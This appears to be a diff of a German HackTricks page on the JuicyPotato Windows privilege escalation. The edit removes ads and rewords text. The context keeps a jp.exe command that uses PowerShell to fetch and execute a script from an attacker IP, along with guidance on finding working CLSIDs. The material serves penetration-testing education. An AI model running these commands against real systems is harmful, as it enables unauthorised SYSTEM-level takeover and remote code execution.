@@ -15,20 +15,6 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 </details>
 {% endhint %}
 
-### [WhiteIntel](https://whiteintel.io)
-
-<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
-
-[**WhiteIntel**](https://whiteintel.io) ist eine **Dark-Web**-unterstützte Suchmaschine, die **kostenlose** Funktionen bietet, um zu überprüfen, ob ein Unternehmen oder dessen Kunden durch **Stealer-Malware** **kompromittiert** wurden.
-
-Das Hauptziel von WhiteIntel ist es, Kontoübernahmen und Ransomware-Angriffe zu bekämpfen, die durch informationsstehlende Malware verursacht werden.
-
-Du kannst ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:
-
-{% embed url="https://whiteintel.io" %}
-
-***
-
 {% hint style="warning" %}
 **JuicyPotato funktioniert nicht** auf Windows Server 2019 und Windows 10 Build 1809 und höher. Allerdings können [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) verwendet werden, um **die gleichen Berechtigungen zu nutzen und Zugriff auf `NT AUTHORITY\SYSTEM`** zu erhalten. _**Überprüfe:**_
 {% endhint %}
@@ -49,7 +35,7 @@ _Eine gesüßte Version von_ [_RottenPotatoNG_](https://github.com/breenmachine/
 
 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) und seine [Varianten](https://github.com/decoder-it/lonelypotato) nutzen die Privilegieneskalationskette basierend auf [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [Dienst](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126), der den MiTM-Listener auf `127.0.0.1:6666` hat und wenn du `SeImpersonate` oder `SeAssignPrimaryToken` Berechtigungen hast. Während einer Überprüfung des Windows-Builds fanden wir eine Konfiguration, bei der `BITS` absichtlich deaktiviert war und der Port `6666` belegt war.
 
-Wir entschieden uns, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu waffen: **Sag Hallo zu Juicy Potato**.
+Wir beschlossen, [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) zu waffen: **Sag Hallo zu Juicy Potato**.
 
 > Für die Theorie siehe [Rotten Potato - Privilegieneskalation von Dienstkonten zu SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) und folge der Kette von Links und Referenzen.
 
@@ -128,7 +114,7 @@ c:\Users\Public>
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### Starte eine neue CMD (wenn du RDP-Zugriff hast)
+### Starte ein neues CMD (wenn du RDP-Zugriff hast)
 
 ![](<../../.gitbook/assets/image (300).png>)
 
@@ -142,7 +128,7 @@ Oft funktioniert die standardmäßige CLSID, die JuicyPotato verwendet, **nicht*
 
 Zuerst benötigst du einige ausführbare Dateien neben juicypotato.exe.
 
-Lade [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und lade es in deine PS-Sitzung, und lade [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) herunter und führe es aus. Dieses Skript erstellt eine Liste möglicher CLSIDs zum Testen.
+Lade [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) herunter und lade es in deine PS-Sitzung, und lade [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) herunter und führe es aus. Dieses Skript erstellt eine Liste möglicher CLSIDs, die getestet werden können.
 
 Lade dann [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat) herunter (ändere den Pfad zur CLSID-Liste und zur juicypotato-executablen Datei) und führe es aus. Es wird versuchen, jede CLSID zu testen, und **wenn sich die Portnummer ändert, bedeutet das, dass die CLSID funktioniert hat**.
 
@@ -152,17 +138,6 @@ Lade dann [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Te
 
 * [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
 
-### [WhiteIntel](https://whiteintel.io)
-
-<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
-
-[**WhiteIntel**](https://whiteintel.io) ist eine **Dark-Web**-unterstützte Suchmaschine, die **kostenlose** Funktionen bietet, um zu überprüfen, ob ein Unternehmen oder dessen Kunden durch **Stealer-Malware** **kompromittiert** wurden.
-
-Das Hauptziel von WhiteIntel ist es, Kontoübernahmen und Ransomware-Angriffe zu bekämpfen, die durch informationsstehlende Malware verursacht werden.
-
-Du kannst ihre Website besuchen und ihre Engine **kostenlos** ausprobieren unter:
-
-{% embed url="https://whiteintel.io" %}
 
 {% hint style="success" %}
 Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -174,7 +149,7 @@ Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 * Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
 * **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos sendest.
+* **Teile Hacking-Tricks, indem du PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
